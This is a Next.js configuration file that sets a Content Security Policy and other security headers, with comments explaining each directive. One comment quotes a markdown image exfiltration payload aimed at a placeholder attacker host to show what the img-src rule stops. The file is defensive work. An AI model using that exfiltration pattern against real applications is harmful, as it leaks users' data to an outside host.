import createNextIntlPlugin from 'next-intl/plugin'

const withNextIntl = createNextIntlPlugin('./src/i18n.ts')

// L5 — Content Security Policy.
// Goal: ensure that any user-controlled string that accidentally renders as
// HTML (today everything goes through React's auto-escape, but the policy is
// defence in depth) cannot reach an attacker-controlled host. The two most
// important directives below:
//   * img-src: only same-origin, data: URIs, blobs, and Supabase storage.
//     Stops `![](https://attacker/?d=...)` style exfil if a markdown renderer
//     is ever added.
//   * connect-src: only same-origin and Supabase. Stops fetch/XHR exfil from
//     any client code an attacker manages to inject.
//
// 'unsafe-inline' on style-src is required by Tailwind/CSS-in-JS. Scripts use
// 'self'; in development we additionally allow 'unsafe-eval' for Next's hot
// reloader. If we later move to nonce-based CSP we can drop 'unsafe-inline'
// from style-src too.
function buildCsp() {
  const isDev = process.env.NODE_ENV !== 'production'
  const scriptExtra = isDev ? " 'unsafe-eval' 'unsafe-inline'" : " 'unsafe-inline'"

  return [
    "default-src 'self'",
    `script-src 'self'${scriptExtra}`,
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data: blob: https://*.supabase.co",
    "font-src 'self' data:",
    "connect-src 'self' https://*.supabase.co wss://*.supabase.co",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "form-action 'self'",
  ].join('; ')
}

const SECURITY_HEADERS = [
  { key: 'Content-Security-Policy', value: buildCsp() },
  { key: 'X-Content-Type-Options',  value: 'nosniff' },
  { key: 'X-Frame-Options',         value: 'DENY' },
  { key: 'Referrer-Policy',         value: 'strict-origin-when-cross-origin' },
  { key: 'Permissions-Policy',      value: 'camera=(), microphone=(), geolocation=()' },
]

/** @type {import('next').NextConfig} */
const nextConfig = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: SECURITY_HEADERS,
      },
    ]
  },
  webpack: (config, { isServer }) => {
    if (!isServer) {
      // global-agent uses Node.js built-ins (net, tls, fs) that don't exist in
      // the browser. Since global-agent is only called server-side (instrumentation),
      // we stub these modules out for the browser bundle so webpack doesn't error.
      config.resolve.fallback = {
        ...config.resolve.fallback,
        net: false,
        tls: false,
        fs:  false,
      }
    }
    return config
  },
  experimental: {
    serverComponentsExternalPackages: ['@anthropic-ai/sdk', '@supabase/supabase-js', '@supabase/ssr', 'global-agent', 'undici'],
    instrumentationHook: true,
  },
}

export default withNextIntl(nextConfig)
